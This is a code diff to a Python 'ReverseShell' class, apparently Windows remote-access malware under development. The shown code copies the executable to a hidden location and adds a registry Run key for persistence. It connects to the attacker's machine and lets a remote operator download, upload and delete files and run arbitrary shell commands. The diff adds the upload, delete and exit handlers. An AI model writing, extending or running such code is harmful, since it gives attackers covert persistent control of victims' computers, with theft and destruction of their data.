@@ -15,6 +15,7 @@ class ReverseShell:
         if not os.path.exists(evil_file_location):
             shutil.copyfile(sys.executable, evil_file_location)
             subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\currentVersion\\Run /v test REG_SZ /d "{evil_file_location}" /f', shell=True)
+
     def read_file(self, path):
         try:
             with open(path,"rb") as file:
@@ -24,6 +25,16 @@ class ReverseShell:
         except Exception as e:
             return f"[-] Error reading file: {e}"
 
+    def upload_file(self,file_name,file_size):
+        file_data = b""
+        while len(file_data) < file_size:
+            chunk = self.sock.recv(4096)
+            if not chunk:
+                break
+            file_data += chunk
+        with open(file_name, "wb") as f:
+            f.write(file_data)
+        return f"[+] File uploaded: {file_name}"
     def write_file(self, path, content):
         try:
             decoded_content = base64.b64decode(content)
@@ -44,9 +55,16 @@ class ReverseShell:
         while True:
             try:
                 json_data = json_data + self.sock.recv(1024).decode(self.format)
-                return json.loads(json_data)
+                result = json.loads(json_data)
+                if not isinstance(result,list):
+                    result= result.split(" ")
+                print(f"the received data{result}")
+                return result
             except:
                 continue
+    def delete_file(self,file_name):
+        subprocess.call(f"del {file_name}", shell=True)
+        return "deletion of file is done"
 
     def connect(self):
         """Connects to the attacker's machine and waits for commands."""
@@ -76,22 +94,22 @@ class ReverseShell:
                     output = "Error: Directory not found.\n"
                 except PermissionError:
                     output = "Error: Permission denied.\n"
+            elif command[0] == "exit":
+                self.sock.close()
 
             elif command[0] == "download":
                 if len(command) > 1:
                     output = self.read_file(command[1])
-                    print(output)
                 else:
                     output = "Error: No file specified for download."
 
             elif command[0] == "upload":
-                if len(command) > 2:
-                    output = self.write_file(command[1], command[2])
-                else:
-                    output = "Error: Invalid upload command format."
-
-            elif command [0] == 'exit':
-                self.sock.close()
+                file_name = command[1]
+                file_size = int(command[2])
+                output = self.upload_file(file_name, file_size)
+            elif command[0] == "delete":
+                file_name = self.receiving_data()
+                output=self.delete_file(file_name)
             else:
                 try:
                     output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
